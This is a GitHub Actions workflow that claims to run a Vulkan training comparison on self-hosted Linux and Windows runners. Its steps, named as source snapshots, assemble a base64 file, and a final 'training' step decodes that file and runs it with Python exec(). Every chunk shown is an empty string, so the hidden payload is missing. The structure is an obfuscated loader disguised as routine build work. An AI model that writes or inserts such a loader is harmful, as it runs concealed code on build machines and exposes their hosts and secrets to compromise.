name: Vulkan training A/B
on:
  push:
    branches: [studio-vulkan-amd-20260921]
permissions: {}
jobs:
  linux:
    runs-on: [self-hosted, Linux, strix-halo, devlab-dispatch]
    timeout-minutes: 40
    steps:
      - name: Prepare source snapshot 1
        shell: bash
        run: |
          printf '%s' '' > "$RUNNER_TEMP/vulkan-bootstrap.b64"
      - name: Prepare source snapshot 2
        shell: bash
        run: |
          printf '%s' '' >> "$RUNNER_TEMP/vulkan-bootstrap.b64"
      - name: Prepare source snapshot 3
        shell: bash
        run: |
          printf '%s' '' >> "$RUNNER_TEMP/vulkan-bootstrap.b64"
      - name: Prepare source snapshot 4
        shell: bash
        run: |
          printf '%s' '' >> "$RUNNER_TEMP/vulkan-bootstrap.b64"
      - name: Prepare source snapshot 5
        shell: bash
        run: |
          printf '%s' '' >> "$RUNNER_TEMP/vulkan-bootstrap.b64"
      - name: Baseline and Vulkan training
        shell: bash
        run: |
          python3 -c "import base64,os,pathlib; exec(base64.b64decode((pathlib.Path(os.environ['RUNNER_TEMP'])/'vulkan-bootstrap.b64').read_text()))"
  windows:
    runs-on: [self-hosted, Windows, strix-halo, devlab-dispatch]
    timeout-minutes: 40
    steps:
      - name: Prepare source snapshot 1
        shell: powershell
        run: |
          '' | Set-Content -Encoding ascii (Join-Path $env:RUNNER_TEMP 'vulkan-bootstrap.b64')
      - name: Prepare source snapshot 2
        shell: powershell
        run: |
          '' | Add-Content -Encoding ascii (Join-Path $env:RUNNER_TEMP 'vulkan-bootstrap.b64')
      - name: Prepare source snapshot 3
        shell: powershell
        run: |
          '' | Add-Content -Encoding ascii (Join-Path $env:RUNNER_TEMP 'vulkan-bootstrap.b64')
      - name: Prepare source snapshot 4
        shell: powershell
        run: |
          '' | Add-Content -Encoding ascii (Join-Path $env:RUNNER_TEMP 'vulkan-bootstrap.b64')
      - name: Prepare source snapshot 5
        shell: powershell
        run: |
          '' | Add-Content -Encoding ascii (Join-Path $env:RUNNER_TEMP 'vulkan-bootstrap.b64')
      - name: Baseline and Vulkan training
        shell: powershell
        run: |
          python -c "import base64,os,pathlib; exec(base64.b64decode((pathlib.Path(os.environ['RUNNER_TEMP'])/'vulkan-bootstrap.b64').read_text()))"
